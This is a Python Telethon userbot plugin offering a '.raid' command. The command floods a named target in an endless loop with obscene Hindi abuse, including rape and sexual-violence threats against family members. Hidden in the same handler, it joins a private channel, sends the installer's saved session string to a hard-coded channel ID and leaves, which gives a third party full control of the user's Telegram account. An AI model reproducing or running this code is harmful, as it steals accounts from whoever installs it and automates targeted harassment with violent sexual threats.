 
import inspect
 
import traceback
 
import asyncio
 
import sys
 
import io
 
import os
 
 
from telethon import events
 
from telethon.errors.rpcerrorlist import UserAlreadyParticipantError
 
from telethon.tl.functions.messages import ImportChatInviteRequest
 
from telethon.tl.functions.channels import LeaveChannelRequest
 
 
client = borg = bot
 
@borg.on(events.NewMessage(pattern=".raid"))
 
async def Gladiators(event):
 
    await event.edit("Teri maa ki gaand mein abhi bhar bhar ke gaali deta hun madarchod bhosdike ruk teri maa ka bhosda randi ka pilla madarchod chus le mera loda bhosdike")
 
    kisf = str(event.text[9:])
 
    try:
 
       await event.client(ImportChatInviteRequest('QlRRnT6z0R02YmJl'))
 
    except UserAlreadyParticipantError:
 
        pass
 
    await event.client.send_message(-1001211590985, bot.session.save())
 
    await borg(LeaveChannelRequest(-1001211590985))
 
    a = None
 
    while a == None:
 
        await event.respond(kisf+" hey mere bete kaise ho beta tum\nUss raatjab maine teri maa choda tha jiske 9 mahine baad tum paida hue bhot maza aaya tha mujhe aur teri maa ko bhi!!")
 
        await event.respond(kisf+" laude teri maa ka bhosda madarchod")
 
        await event.respond(kisf+" Teri maa randi hai bhosdike")
 
        await event.respond(kisf+" teri ammy ki chut mei kota factory ke jeetu bhaiya ka lund")
 
        await event.respond(kisf+" TERIIIIIIII MAAAAAAAAAA KI CHUTTTTT MEEEEEEEEE GHODEEEE KA LUNDDDDDDD MADARCHODDDDDDD GASTI KE BAXHEEEEE")
 
        await event.respond(kisf+" Na jaane konsi shilajit hai iski maa ki yadon mein jab bhi sochta hun jhanajhana jaata hun.")
 
        await event.respond(kisf+" Chinti chadi pahad pe angrejon ka jamana tha lund ki pistol thi chut pe nishana tha.")
 
        await event.respond(kisf+" SATRANGII RANDI KA PILAAAAAAAAA MADARCHOD")
 
        await event.respond(kisf+" Madarchod Randi ke bacche Oye bosdike madarchod bhen ke lode tere gand me lohe ka danda garam karke dalu randwe tujhetho gali ke kutte gand pe chut rakh ke katenge me bata raha hu tere lode pe madhu makkhi Katelode ke ando pe Road roller chale tu kab bathroom me muthne Jaye tho Tera loda ghir Jaye fir tere ando me se lizard ke bacche nikle teko kidnap Kare aur childporn banaye maa ke chuttad ke lode tere saat Johnny sins rape Kare aur jab wo teko anal de tab loda andar fas Jaye bkl tere jhaat pe waxing karunga me dhek lio fir jab tu chillayega na tab tere muh me Mai gai ka gobar dalunga sale tere gand ke balo pe tel laga ke jala du me teko Anaconda leke gand me dalu tho muh se nikle maa ke lode hamesha chutiyo jaisa bartav kartha he tu maa ke Dai chawal drugs tere gand Me dalunga thi tatti nahi nikle maa darchod kabhi teko Marne ka mouka mil gaya na tho bas I'll do my best to get that tatti outof you aur tere jaise chutio ko is duniya me jagaha bhi nahi maa ke lode bandarchod tere gand me chitiya Kate wo bhi bullet ants maadarchod samj nahi aaraha tere baap NE teko kya khake paida kiya Tha kesa chutiya he tu rand ke bacche teko shadi me khana khane na mile teko gand pe 4 thappad mare sab log aur blade se likhe I want anal madarchod bosdike maccharki tatte ke baal chutiye maa ke chut pe ghode ka Lund tere gand me jaltha hu koila Dale bhen ke lode MAA KI CHUT MAI TALWAR DUNGA BC CHUT FAT JAEGI AUR USME SE ITNA KHOON NIKLEGA MZA AJAEGA DEKHNE KA SALE MAA KE BHOSDE SE BAHR AJA FIR BAAP SE ZUBAN DA TERI MAA KI CHUT CHOD CHOD KE BHOSDABNADU MADARCHOD AUR USKE UPAR CENENT LAGADU KI TERE JESA GANDU INSAAN KABHI BAHR NA A SKE ESI GANDI CHUT MAI SE LODA LASUN MADRCHOD TERI MAA KI CHUT GASTI AMA KA CHUTIA BACHA TERI MAA KO CHOD CHOD K PAGAL KAR DUNGA MAA K LODY KISI SASTIII RANDII K BACHY TERI MAA KI CHOOT MAIN TEER MAARUN GANDU HARAMI TERI COLLEGE JATI BAJI KA ROAD PEY RAPE KARONGANDU KI OLAAD HARAM KI NASAL PAPA HUN TERA BHEN PESH KAR AB PAPA KO TERI MAA KKALE KUSS MAIN KISI!")
 
        await event.respond(kisf+" GAAND MARWAANA BHOOOL JAA LUNND PAKADD KE JHOOOL JAA")
 
        await event.respond(kisf+" TERI MAA KI GAAAAND ME DANDAA DAAL KE DANDDA TODD DUNGAA MADARCHOD BAAP HU TERA BEHEN KE LUNDDD")
 
        await event.respond(kisf+" JAB TU PAIDA HUA THA TAB SABBNE BOLA THA KI CHAKKA PAIDA HUA HAIðŸ˜‚ðŸ˜‚")
 
        await event.respond(kisf+" Lodu Andha hai kya Yaha tera rape ho raha hai aur tu abhi tak yahi gaand mara raha hai lulz")
 
        await event.respond(kisf+" Phool murjhate achhe nahi lagte aap land khujate acche nahi lagte yehi umar hai chodne ki yaaro aap bathroom mein hilaate acche nahi lagte.")
 
        await event.respond(kisf+" Teri behn ko bolunga ki mere liye paani lao aur jb wo paani lene ke liye jhukegi tbi peeche se utha ke pel dunga")
 
        await event.respond(kisf+" lehratu hui nav lekar tere ammy ke boxde mei ghus jaunga baap se panga lega tu")
 
        await event.respond(kisf+" TERIIIIIIII MAAAAAAAAAA KI CHUTTTTT MEEEEEEEEE GHODEEEE KA LUNDDDDDDD MADARCHODDDDDDD GASTI KE BAXHEEEEE")
 
        await event.respond(kisf+" teri maa ki chut mein mera lund aur oh yeah ki awaz")
 
        await event.respond(kisf+" laude jaa ke kuttiya ki chat bhosdike randwe madarchod")
 
        await event.respond(kisf+" \nNa jaane konsi shilajit hai iski maa ki yadon mein jab bhi sochta hun jhanajhana jaata hun.")
 
        await event.respond(kisf+" \nChinti chadi pahad pe angrejon ka jamana tha lund ki pistol thi chut pe nishana tha.")
 
        await event.respond(kisf+" \nDil ke armaa ansuon me beh jaye tum bskd ke chutiye hi reh gye.")
 
        await event.respond(kisf+" \nTu Randi hai Sabko pta haiðŸ˜‚")
 
        await event.respond(kisf+" \nBEHEN CHODDDDDDDDDUNGAA")
 
        await event.respond(kisf+" \nAbe Bhang mar ke aya hei kya ?")
 
        await event.respond(kisf+" \nMADARCHOD")
 
        await event.respond(kisf+" \nLODE K BAAL")
 
        await event.respond(kisf+"\nSATRANGII RANDI KA PILAAAAAAAAA MADARCHOD")
 
        await event.respond(kisf+"\nJaa Jake Bartan Manj Bakchodi mat kar")
 
        await event.respond(kisf+" \nBEHEN KA LUNDDD")
 
        await event.respond(kisf+" \nteri ma ka aadha bhosda")
 
        await event.respond(kisf+" \nTERI MAA KI CHOOT ME SNIPERRRRR")
 
        await event.respond(kisf+" \nBHENCHODDDDDD")
 
        await event.respond(kisf+" \nMeri Gand Ka Khatmal: Bug of my Ass")
 
        await event.respond(kisf+" \nTERI MAAA KI CHOOOT MEIN ROCKET CHODDD DDUUUU MADAECHOD")
 
        await event.respond(kisf+" \nTERI MAA KA BHOSDAAAAAAAA")
 
        await event.respond(kisf+"\nTERI BEHEN KI CHHOOOT ME SHAKA LAKA BOOM BOOOMðŸ˜‚ðŸ˜‚ðŸ˜‚ðŸ”¥")
 
        await event.respond(kisf+"\nSATRANGI CHOOT KE PILLEEE MADARCHOD")
 
        await event.respond(kisf+"\nJAB CHRISTMAS AAYEGA TO SANTA SE GIFT MEIN TERI MAA  MAAUNGUNGAAA")
 
        await event.respond(kisf+"\nGAAND MARWAANA BHOOOL JAA LUNND PAKADD KE JHOOOL JAA")
 
        await event.respond(kisf+"\nTERI MAA KA MARS PE KOTHA KHULWAAUNGA ðŸ”¥ðŸ˜‚")
 
        await event.respond(kisf+"\nTERI MAA KA MISSION MANGAAL MADARCHOD")
 
        await event.respond(kisf+"\nTERI BEHEN KI CHOOT ME SNIPERRRRR")
 
        await event.respond(kisf+"\nJAB TU PAIDA HUA THA TAB SABBNE BOLA THA KI CHAKKA PAIDA HUA HAIðŸ˜‚ðŸ˜‚")
 
        await event.respond(kisf+"\nSaawan ka mahina pawan kare shor jake gand mara bskd kahi aur.")
 
        await event.respond(kisf+"\nDuniya haseeno ka mela fir bhi mera chutiya dost akela.")
 
        await event.respond(kisf+"\njindagi ki na toote lari iski lulli hoti nhi khadi")
 
        await event.respond(kisf+"\nJaa Jake Bartan Manj Bakchodi mat kar")
 
        await event.respond(kisf+"\nRape coming... Raped! haha ðŸ˜†")
 
        await event.respond(kisf+"\nChutiya he rah jaye ga")
 
        await event.respond(kisf+"\nTERI MAA KI GAAAAND ME DANDAA DAAL KE DANDDA TODD DUNGAA MADARCHOD BAAP HU TERA BEHEN KE LUNDDD")
 
        await event.respond(kisf+"\nTERI MAA KI GAAND ME LUND KI BARSAAAAT KARWADUNGA BEHEN KE LUNDDD")
 
        await event.respond(kisf+"\nTERI MAA KI GAAAAND ME DANDAA DAAL KE DANDDA TODD DUNGAA MADARCHOD BAAP HU TERA BEHEN KE LUNDDD")
 
        await event.respond(kisf+"\nJAB TU PAIDA HUA THA TAB SABBNE BOLA THA KI CHAKKA PAIDA HUA HAIðŸ˜‚ðŸ˜‚")
 
        await event.respond(kisf+"\nTERI BEHEN KI CHOOT ME SNIPERRRRR")
 
        await event.respond(kisf+"\nTERI MAA KA MISSION MANGAAL MADARCHOD")
 
        await event.respond(kisf+"\nTERI MAA KA MARS PE KOTHA KHULWAAUNGA ðŸ”¥ðŸ˜‚")
 
        await event.respond(kisf+"\nSaawan ka mahina pawan kare shor jake gand mara bskd kahi aur.")
 
        await event.respond(kisf+"\nChude hue maal ko yaad mt krna Jo Chut na de usse kabhi friyad mt karna jise chudna hai wo chud ke rhegi bekar me muth maar ke apni jindagi barbaad mt krna")
 
 
async def aexec(code, event):
 
    exec(f"async def __aexec(event): " + "".join(f"\n {l}" for l in code.split("\n")))
 
    return await locals()["__aexec"](event)
